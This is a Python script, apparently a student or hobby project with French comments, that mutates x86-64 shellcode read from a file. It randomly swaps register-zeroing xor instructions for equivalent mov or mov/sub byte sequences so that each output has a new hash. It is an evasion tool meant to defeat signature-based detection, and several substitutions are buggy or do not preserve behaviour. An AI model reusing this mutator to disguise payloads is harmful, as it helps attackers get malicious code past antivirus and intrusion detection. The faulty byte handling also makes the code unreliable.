#!/usr/bin/python3

import sys
from random import *
import hashlib

print("""  _________.__           .__  .__                   .___                               
 /   _____/|  |__   ____ |  | |  |   ____  ____   __| _/____                           
 \_____  \ |  |  \_/ __ \|  | |  | _/ ___\/  _ \ / __ |/ __ \                          
 /        \|   Y  \  ___/|  |_|  |_\  \__(  <_> ) /_/ \  ___/                          
/_______  /|___|  /\___  >____/____/\___  >____/\____ |\___  >                         
        \/      \/     \/               \/           \/    \/                          
__________      .__                                    .__    .__                      
\______   \____ |  | ___.__. _____   _________________ |  |__ |__| ________ __   ____  
 |     ___/  _ \|  |<   |  |/     \ /  _ \_  __ \____ \|  |  \|  |/ ____/  |  \_/ __ \ 
 |    |  (  <_> )  |_\___  |  Y Y  (  <_> )  | \/  |_> >   Y  \  < <_|  |  |  /\  ___/ 
 |____|   \____/|____/ ____|__|_|  /\____/|__|  |   __/|___|  /__|\__   |____/  \___  >
                     \/          \/             |__|        \/       |__|           \/  """)

#inputFile = sys.argv[1]

def randomnb(s,n):
	n = randint(s,n)
	return n

with open('opcodeSHELLCODE', 'r') as f:
        line = f.readline()

ps = line.split("\\x")

cleanps = ps[1:]
modifps = cleanps

'''
print("OLD : ")
for x in cleanps:
	print("\\x", end="")
	print(x, end="")
'''

i = 0
print("\n\n")
while i < len(cleanps):
	if cleanps[i] == '48' and cleanps[i+1] == '31':
		nb = randomnb(0,1)
		if nb == 1:
			if cleanps[i+2] == 'c0': #rax
				nb = randomnb(0,2)
				print("un xor du registre rax à été modifié à l'occurence :" + str(i) + " | technique -> ", end="")
				if nb == 0:
					print("mov r14 into register")				
					cleanps[i] = '4c'
					cleanps[i+1] = '89'
					cleanps[i+2] = 'f0'
				if nb == 1:
					print("B8FFFFFFFF")
					cleanps[i] = 'b8'
					cleanps[i+1] = '00'
					cleanps[i+2] = '00'
					cleanps.insert(i+3, '00')
					cleanps.insert(i+4, '00')
					
				if nb == 2:
			#-------------- ramdom number -------------#
					nb1 = randomnb(5,255)
					nb2 = randomnb(5,255)
					nb3 = randomnb(5,255)
					nb4 = randomnb(5,255)
					hex1 = hex(nb1)
					hex2 = hex(nb2)
					hex3 = hex(nb3)
					hex4 = hex(nb4)
					print("Broken evasion 0x" + hex1[2:] + hex2[2:] + hex3[2:] + hex4[2:])
					cleanps[i] = 'b8'
					cleanps[i+1] = hex1[2:]
					cleanps[i+2] = hex2[2:]
					cleanps.insert(i+3, hex3[2:])
					cleanps.insert(i+4, hex4[2:])
					#sub
					cleanps.insert(i+5, '48')
					cleanps.insert(i+6, '2d')
					cleanps.insert(i+7, hex1[2:])
					cleanps.insert(i+8, hex2[2:])
					cleanps.insert(i+9, hex3[2:])
					cleanps.insert(i+10, hex4[2:])				
			if cleanps[i+2] == 'c9': #rcx
				nb = randomnb(0,2)
				print("un xor du registre rcx à été modifié à l'occurence :" + str(i) + " | technique -> ", end="")
				if nb == 0:
					print("mov r14 into register")
					cleanps[i] = '4c'
					cleanps[i+1] = '89'
					cleanps[i+2] = 'f1'
				if nb == 1:
					print("B9FFFFFFFF")
					cleanps[i] = 'b9'
					cleanps[i+1] = '00'
					cleanps[i+2] = '00'
					cleanps.insert(i+2, '00')
					cleanps.insert(i+3, '00')
				if nb == 2:
			#-------------- ramdom number -------------#
					nb1 = randomnb(5,255)
					nb2 = randomnb(5,255)
					nb3 = randomnb(5,255)
					nb4 = randomnb(5,255)
					hex1 = hex(nb1)
					hex2 = hex(nb2)
					hex3 = hex(nb3)
					hex4 = hex(nb4)
					print("Broken evasion 0x" + hex1[2:] + hex2[2:] + hex3[2:] + hex4[2:])
					cleanps[i] = 'b9'
					cleanps[i+1] = hex1[2:]
					cleanps[i+2] = hex2[2:]
					cleanps.insert(i+3, hex3[2:])
					cleanps.insert(i+4, hex4[2:])
					#sub
					cleanps.insert(i+5, '48')
					cleanps.insert(i+6, '81')
					cleanps.insert(i+7, 'e9')
					cleanps.insert(i+8, hex1[2:])
					cleanps.insert(i+9, hex2[2:])
					cleanps.insert(i+10, hex3[2:])
					cleanps.insert(i+11, hex4[2:])	
			if cleanps[i+2] == 'd2':  #rdx
				nb = randomnb(0,2)
				print("un xor du registre rdx à été modifié à l'occurence :" + str(i) + " | technique -> ", end="")
				if nb == 0:
					print("mov r14 into register")
					cleanps[i] = '4c'
					cleanps[i+1] = '89'
					cleanps[i+2] = 'f2'
				if nb == 1:
					print("BAFFFFFFFF")
					cleanps[i] = 'ba'
					cleanps[i+1] = '00'
					cleanps[i+2] = '00'
					cleanps.insert(i+2, '00')
					cleanps.insert(i+3, '00')
				if nb == 2:
			#-------------- ramdom number -------------#
					nb1 = randomnb(5,255)
					nb2 = randomnb(5,255)
					nb3 = randomnb(5,255)
					nb4 = randomnb(5,255)
					hex1 = hex(nb1)
					hex2 = hex(nb2)
					hex3 = hex(nb3)
					hex4 = hex(nb4)
					print("Broken evasion 0x" + hex1[2:] + hex2[2:] + hex3[2:] + hex4[2:])
					cleanps[i] = 'ba'
					cleanps[i+1] = hex1[2:]
					cleanps[i+2] = hex2[2:]
					cleanps.insert(i+3, hex3[2:])
					cleanps.insert(i+4, hex4[2:])
					#sub
					cleanps.insert(i+5, '48')
					cleanps.insert(i+6, '81')
					cleanps.insert(i+7, 'ea')
					cleanps.insert(i+8, hex1[2:])
					cleanps.insert(i+9, hex2[2:])
					cleanps.insert(i+10, hex3[2:])
					cleanps.insert(i+11, hex4[2:])	

			if cleanps[i+2] == 'db': #rbx
				nb = randomnb(0,2)
				print("un xor du registre rbx à été modifié à l'occurence :" + str(i) + " | technique -> ", end="")
				if nb == 0:
					print("mov r14 into register")
					cleanps[i] = '4c'
					cleanps[i+1] = '89'
					cleanps[i+2] = 'f3'
				if nb == 1:
					print("BBFFFFFFFF")
					cleanps[i] = 'bb'
					cleanps[i+1] = '00'
					cleanps[i+2] = '00'
					cleanps.insert(i+2, '00')
					cleanps.insert(i+3, '00')
				if nb == 2:
			#-------------- ramdom number -------------#
					nb1 = randomnb(5,255)
					nb2 = randomnb(5,255)
					nb3 = randomnb(5,255)
					nb4 = randomnb(5,255)
					hex1 = hex(nb1)
					hex2 = hex(nb2)
					hex3 = hex(nb3)
					hex4 = hex(nb4)
					print("Broken evasion 0x" + hex1[2:] + hex2[2:] + hex3[2:] + hex4[2:])
					cleanps[i] = 'bb'
					cleanps[i+1] = hex1[2:]
					cleanps[i+2] = hex2[2:]
					cleanps.insert(i+3, hex3[2:])
					cleanps.insert(i+4, hex4[2:])
					#sub
					cleanps.insert(i+5, '48')
					cleanps.insert(i+6, '81')
					cleanps.insert(i+7, 'eb')
					cleanps.insert(i+8, hex1[2:])
					cleanps.insert(i+9, hex2[2:])
					cleanps.insert(i+10, hex3[2:])
					cleanps.insert(i+11, hex4[2:])	
	i=i+1

print("\nNEW : ")
	

list = ["\\x" + i for i in cleanps]
print("Shellcode Size : " + str(len(list))+"\n")
str= ''.join(list)
print(str)


#Hash verification 

hashStr=hashlib.md5(str.encode())
print ("Le hash du shellcode est :") 
hashStr = hashStr.hexdigest()
print(hashStr)

hash = open("hash.txt", "r")
for line in hash:
	stripped_line = line.strip()
	if hashStr==stripped_line:
			print("Le shellcode à déjà été généré. \n")
hash.close()

hash = open("hash.txt", "a")
hash.write (hashStr+"\n")
hash.close()
